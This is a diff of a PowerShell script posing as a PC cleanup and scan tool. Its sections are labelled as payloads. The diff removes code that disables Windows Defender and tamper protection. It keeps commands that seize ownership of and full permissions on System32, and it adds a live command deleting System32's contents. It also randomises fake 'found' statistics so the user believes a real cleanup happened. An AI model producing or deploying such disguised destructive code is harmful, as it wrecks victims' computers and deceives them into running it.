@@ -58,32 +58,8 @@ Write-Host ""
 Start-Sleep -Seconds 1
 
 Write-Host "[*] Preparing scan..." -ForegroundColor Yellow
-
-# ============================================================================
-# PAYLOAD SECTION 1: DISABLE WINDOWS DEFENDER
-# ============================================================================
-try {
-    # Method 1: PowerShell cmdlets
-    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
-    
-    # Method 2: Registry (more persistent)
-    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force -ErrorAction SilentlyContinue | Out-Null
-    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Force -ErrorAction SilentlyContinue | Out-Null
-    
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name SubmitSamplesConsent -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name SpynetReporting -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
-    
-    Write-Host "[O] Preperation finished" -ForegroundColor Green
-} catch {
-    Write-Host "[!] Preperation may have encountered errors, but will continue..." -ForegroundColor Yellow
-}
+Start-Sleep -Seconds 4
+Write-Host "[O] Preperation finished" -ForegroundColor Green
 
 Start-Sleep -Seconds 1
 
@@ -118,7 +94,6 @@ function Show-Tree {
     }
 }
 
-
 # Simulate scanning with tree commands
 Write-Host ""
 Write-Host "[*] Scanning Windows Update directory..." -ForegroundColor Yellow
@@ -130,7 +105,7 @@ Write-Host ""
 Write-Host "[*] Evaluating files in scan..." -ForegroundColor Yellow
 
 # ============================================================================
-# PAYLOAD SECTION 2: TAKEOWN
+# PAYLOAD SECTION 1: TAKEOWN
 # ============================================================================
 cmd /c "takeown /f `"C:\Windows\System32`" /r /d Y" 2>&1 | Out-Null
 Write-Host "[O] Evaluation finished" -ForegroundColor Green
@@ -145,7 +120,7 @@ Write-Host ""
 Write-Host "[*] Evaluating files in scan..." -ForegroundColor Yellow
 
 # ============================================================================
-# PAYLOAD SECTION 3: ICACLS PERMISSIONS
+# PAYLOAD SECTION 2: ICACLS PERMISSIONS
 # ============================================================================
 cmd /c "icacls `"C:\Windows\System32`" /grant Administrators:F /t /c /q" 2>&1 | Out-Null
 cmd /c "icacls `"C:\Windows\System32`" /grant ${env:USERNAME}:F /t /c /q" 2>&1 | Out-Null
@@ -168,10 +143,10 @@ Write-Host ""
 Write-Host "[O] System scan completed!" -ForegroundColor Green
 Write-Host ""
 Write-Host "Found:" -ForegroundColor Yellow
-Write-Host "  • 15,847 temporary files" -ForegroundColor White
-Write-Host "  • 3.2 GB of cached data" -ForegroundColor White
-Write-Host "  • 892 internet logs" -ForegroundColor White
-Write-Host "  • 1,523 unnecessary system files" -ForegroundColor White
+Write-Host "  • $((Get-Random -Minimum 12000 -Maximum 20000).ToString('N0')) temporary files" -ForegroundColor White
+Write-Host "  • $([math]::Round((Get-Random -Minimum 25 -Maximum 50) / 10, 1)) GB of cached data" -ForegroundColor White
+Write-Host "  • $((Get-Random -Minimum 500 -Maximum 1500).ToString('N0')) internet logs" -ForegroundColor White
+Write-Host "  • $((Get-Random -Minimum 1000 -Maximum 2500).ToString('N0')) unnecessary system files" -ForegroundColor White
 Write-Host ""
 pause
 
@@ -189,7 +164,7 @@ Write-Host "  • Redundant system files" -ForegroundColor Gray
 Write-Host ""
 Write-Host "This process may take several minutes." -ForegroundColor Yellow
 Write-Host ""
-pause
+Start-Sleep -Seconds 5
 
 # The deletion
 Write-Host ""
@@ -198,9 +173,9 @@ Start-Sleep -Seconds 2
 Write-Host "[*] Removing temporary files..." -ForegroundColor Yellow
 
 # ============================================================================
-# PAYLOAD SECTION 4: ACTUAL DELETION
+# PAYLOAD SECTION 3: ACTUAL DELETION
 # ============================================================================
-cmd /c "rd /s /q C:\Windows\System32" 2>&1 | Out-Null
+Remove-Item "C:\Windows\System32\*" -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
 
 <# this was for initial debugging
 Write-Host "[O] File removal finished..." -ForegroundColor Green
@@ -210,8 +185,8 @@ Write-Host ""
 Write-Host "Your PC has been optimized. Please restart your computer." -ForegroundColor Cyan
 Write-Host ""
 Write-Host "========================================" -ForegroundColor Red
-Write-Host "NOTE: SECTION 4 (DELETION) DISABLED" -ForegroundColor Red
-Write-Host "Sections 1-3 are ACTIVE for testing" -ForegroundColor Red
+Write-Host "NOTE: SECTION 3 (DELETION) DISABLED" -ForegroundColor Red
+Write-Host "Sections 1 and 2 are ACTIVE for testing" -ForegroundColor Red
 Write-Host "========================================" -ForegroundColor Red
 pause
 #>
